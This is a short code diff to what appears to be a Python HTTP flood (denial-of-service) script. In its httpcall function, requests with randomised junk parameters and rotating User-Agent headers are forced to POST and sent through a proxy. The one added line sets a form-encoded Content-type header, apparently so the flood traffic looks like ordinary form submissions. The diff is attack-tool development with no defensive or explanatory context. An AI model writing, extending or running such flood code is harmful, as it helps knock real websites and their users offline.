@@ -86,6 +86,7 @@ def httpcall(url):
 	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Host',host)
+	request.add_header('Content-type', 'application/x-www-form-urlencoded')
         request.get_method = lambda: "POST"
         proxy_support = urllib2.ProxyHandler({"https": "https://www.ovh.nl"})
         opener = urllib2.build_opener(proxy_support)
